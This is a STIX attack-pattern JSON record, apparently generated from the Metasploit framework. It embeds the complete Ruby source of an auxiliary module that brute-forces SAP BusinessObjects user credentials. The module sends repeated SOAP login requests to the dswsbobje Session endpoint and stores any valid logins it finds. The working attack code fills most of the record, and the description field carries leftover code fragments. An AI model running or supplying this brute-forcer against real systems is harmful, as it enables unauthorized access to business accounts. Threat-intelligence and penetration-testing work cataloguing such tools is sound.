{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--429145ed-592b-4850-8b02-37062562ef31",
    "created": "2024-08-14T16:29:04.55553Z",
    "modified": "2024-08-14T16:29:04.555534Z",
    "name": "SAP BusinessObjects User Bruteforcer",
    "description": "This module attempts to bruteforce SAP BusinessObjects users. The dswsbobje interface is only used to verify valid credentials for CmcApp. Therefore, any valid credentials that have been identified can be leveraged by logging into CmcApp.' 'References'  => [ # General",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/sap_businessobjects_user_brute.rb",
            "external_id": "sap_businessobjects_user_brute.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::AuthBrute\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'\t\t   => 'SAP BusinessObjects User Bruteforcer',\n      'Description'\t=> 'This module attempts to bruteforce SAP BusinessObjects users.\n        The dswsbobje interface is only used to verify valid credentials for CmcApp.\n        Therefore, any valid credentials that have been identified can be leveraged by\n        logging into CmcApp.',\n      'References'  =>\n        [\n          # General\n          [ 'URL', 'http://spl0it.org/files/talks/source_barcelona10/Hacking%20SAP%20BusinessObjects.pdf' ]\n        ],\n      'Author'\t\t => [ 'Joshua Abraham <jabra[at]rapid7.com>' ],\n      'License'\t\t=> MSF_LICENSE\n    )\n\n    register_options(\n      [\n        Opt::RPORT(8080),\n        OptString.new('URI', [false, 'Path to the SAP BusinessObjects Axis2', '/dswsbobje']),\n      ])\n    register_autofilter_ports([ 8080 ])\n  end\n\n  def run_host(ip)\n    res = send_request_cgi({\n      'uri'\t => \"/dswsbobje/services/listServices\",\n      'method'  => 'GET'\n    }, 25)\n    return if not res\n\n    each_user_pass { |user, pass|\n      enum_user(user,pass)\n    }\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def enum_user(user='administrator', pass='pass')\n    vprint_status(\"#{rhost}:#{rport} - Trying username:'#{user}' password:'#{pass}'\")\n    success = false\n    soapenv='http://schemas.xmlsoap.org/soap/envelope/'\n    xmlns='http://session.dsws.businessobjects.com/2007/06/01'\n    xsi='http://www.w3.org/2001/XMLSchema-instance'\n\n    data = '<?xml version=\"1.0\" encoding=\"utf-8\"?>' + \"\\r\\n\"\n    data << '<soapenv:Envelope xmlns:soapenv=\"' +  soapenv + '\" xmlns:ns=\"' + xmlns + '\">' + \"\\r\\n\"\n    data << '<soapenv:Body>' + \"\\r\\n\"\n    data << '<login xmlns=\"' + xmlns + '\">' + \"\\r\\n\"\n    data << '<credential xmlns=\"' + xmlns + '\" xmlns:ns=\"' + xmlns + '\" xmlns:xsi=\"' + xsi + '\" Login=\"' + user  + '\" Password=\"' + pass + '\" xsi:type=\"ns:EnterpriseCredential\" />' + \"\\r\\n\"\n    data << '</login>' + \"\\r\\n\"\n    data << '</soapenv:Body>' + \"\\r\\n\"\n    data << '</soapenv:Envelope>' + \"\\r\\n\\r\\n\"\n\n    begin\n      res = send_request_raw({\n        'uri'     => normalize_uri(datastore['URI'], \"/services/Session\"),\n        'method'  => 'POST',\n        'data'\t  => data,\n        'headers' =>\n          {\n            'Content-Length' => data.length,\n            'SOAPAction'\t=> '\"' + 'http://session.dsws.businessobjects.com/2007/06/01/login' + '\"',\n            'Content-Type'  => 'text/xml; charset=UTF-8',\n          }\n      }, 45)\n      return :abort if (!res or (res and res.code == 404))\n      success = true if(res and res.body.match(/SessionInfo/i))\n      success\n\n    rescue ::Rex::ConnectionError\n      vprint_error(\"#{rhost}:#{rport} - Unable to attempt authentication\")\n      return :abort\n    end\n\n    if success\n      print_good(\"#{rhost}:#{rport} - Successful login '#{user}' : '#{pass}'\")\n      report_cred(\n        ip: rhost,\n        port: rport,\n        service_name: 'sap-businessobjects',\n        user: user,\n        proof: res.body\n      )\n      return :next_user\n    else\n      vprint_error(\"#{rhost}:#{rport} - Failed to login as '#{user}'\")\n      return\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        "[ Joshua Abraham <jabra[at]rapid7.com> ]",
        ""
    ]
}